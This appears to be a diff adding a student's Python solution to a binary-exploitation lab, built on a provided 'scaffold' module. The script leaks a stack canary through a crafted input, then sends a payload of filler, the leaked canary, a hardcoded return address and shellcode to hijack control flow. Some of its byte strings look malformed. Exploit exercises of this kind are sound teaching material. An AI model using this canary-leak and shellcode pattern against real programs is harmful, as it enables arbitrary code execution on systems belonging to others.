@@ -1,0 +1,46 @@
+#!/usr/bin/env python3
+
+import scaffold as p
+from scaffold import SHELLCODE
+import sys
+
+# Configure Python to print text strings like byte strings. Don't remove this!
+sys.stdout.reconfigure(encoding='latin1')
+
+### YOUR CODE STARTS HERE ###
+
+# Program start:
+p.start()
+
+# p.send('test\\x41\n') # Example send
+# print("Sending \'test\\\\x41\\n\'")
+# assert p.recv(6) == 'testA\n' # Example receive
+# print("Received \'testA\\n\'")
+
+# prompt = "\\x31\\x32\\x33\\x34"
+# p.send(prompt)
+# print(f"Prompt \'{prompt}\' sent")
+# reply = p.recvline()
+# print(f"Recieved \'{reply}\'")
+
+# prompt = reply
+
+# p.send(prompt)
+# print(f"Prompt \'{prompt}\' sent")
+# reply = p.recvline()
+# print(f"Recieved \'{reply}\'")
+
+buffer = '\\x65\\x66\\x67\\x\n'
+buffer2 = '\\x65\\x66\\x67auv\x00'
+garbage = 'aaaaaaaa'
+rip = '\x60\xdc\xff\xff'
+p.send(buffer)
+print(f"send \'{buffer}\'")
+rt =  p.recvline()
+print(f"got  \'{rt}\'")
+canary = rt[4:12]
+p.send(buffer2+canary+garbage+rip+SHELLCODE+'\n')
+
+print([hex(ord(c)) for c in canary])
+
+### YOUR CODE ENDS HERE ###
